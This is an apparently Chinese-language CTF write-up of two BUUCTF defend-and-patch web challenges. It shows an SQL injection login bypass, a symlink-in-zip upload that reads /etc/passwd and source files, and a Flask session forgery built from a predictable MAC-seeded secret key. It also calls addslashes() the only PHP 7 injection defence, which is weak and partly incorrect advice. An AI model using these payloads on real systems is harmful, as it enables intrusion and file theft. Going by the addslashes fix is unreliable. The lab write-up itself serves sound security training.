# BUUCTF awdp加固题


n内容摘要测试

<!--more-->

## [Ezsql]

![image-20230616161943315](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616161943315.png)

### 1.break

首先进入靶机web页面

![image-20230616162115816](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162115816.png)

猜了弱口令都不对，尝试sql万能密码成功登录

```
用户名：admin' or 1=1#
密码：(填不填都行，填啥也行)
```

题目要求对页面存在的sql注入漏洞进行加固，即可取得flag

### 2.fix

根据题目给的地址端口以及用户名，ssh连接至靶机，进入/var/www/html/目录

![image-20230616162754875](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616162754875.png)

在此处新建一个phpinfo.php并写入语句

```
<?php phpinfo(); ?>
```

![image-20230616205637225](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205637225.png)

访问phpinfo.php可以看到当前php版本为7.3.18

![image-20230616205717499](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616205717499.png)

php中防止sql注入的函数无非就那么几个：（我所知道的）

addslashes()

mysql_real_escape_string() 在php5.5中已经弃用，并在php7中被删除

mysql_escape_string() PHP 4 >= 4.0.3, PHP 5

在PHP7中，能用的只有addslashes()

故应在index.php中添加以下代码

```
$username = addslashes($username);
$password = addslashes($password);
```

添加在此处：

![image-20230616210551430](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210551430.png)

随后进入check服务器/check目录进行check
![image-20230616210742088](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616210742088.png)

通过之后访问/flag得到flag字符串

## [babypython]

![image-20230616215912341](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215912341.png)

### 1.break

进入靶机web页面，是个上传界面，经过尝试后发现只能上传zip文件，猜测是通过上传软链接的压缩包来读取相关信息（压缩一个软链接，类似于windows下的快捷方式，然后网站后台会解压读取该软链接指向的服务器上的文件，就能达到读取任意文件的效果。）
![image-20230616215852903](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616215852903.png)

在Linux环境下：

```
ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```

生成了一个读取**/etc/passwd**的zip软链接**
随后上传我们得到的压缩包passwd.zip便可以在web页面看到回显的passwd文件信息

![image-20230616221815139](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616221815139.png)

再来读取下**app/uwsgi.ini**

> uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议
>
> 

![image-20230616222232148](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222232148.png)

读一下**/app/main.py**

![image-20230616222907980](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616222907980.png)

最终找到源码文件：*/app/y0u_found_it/y0u_found_main.py*

![image-20230616232950895](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616232950895.png)

```
app.config[‘SECRET_KEY’] = str(random.random()*100)
random.seed(uuid.getnode())	设置随机数种子操作。
python random				生成的数是伪随机数
uuid.getnode()				这个函数可以获取网卡mac地址并转换成十进制数返回
```

通过读`/sys/class/net/eth0/address`文件得到mac地址，于是构造软链接、生成zip、上传看返回结果。

![image-20230616235529631](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616235529631.png)

然后就是把mac地址处理下，转换成二进制，然后设置成seed，生成一下KEY

```
import uuid
import random

mac = "c6:98:94:10:39:c6"
temp = mac.split(':')					#去掉":"
temp = [int(i,16) for i in temp]		#遍历mac
temp = [bin(i).replace('0b','').zfill(8) for i in temp]	#十六进制转二
temp = ''.join(temp)					#得到的值赋给temp
mac = int(temp,2)
random.seed(mac)						#将mac作为种子
randStr = str(random.random()*100)
print(randStr)
```

得到KEY:68.61339598479617

同时根据页面提示，只有admin才能获得flag，尝试通过伪造session来伪造admin身份用**flask-session-cookie-manager**伪造session

```
C:\Users\Scofield_Lee\Desktop\flask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s '68.61339598479617' -t "{'username': 'admin'}"

eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w
```

得到session：`eyJ1c2VybmFtZSI6ImFkbWluIn0.ZIyJeg.8rUFY72cFh1JQAALMZKX79N3j2w`

### 2.fix

。。。。。
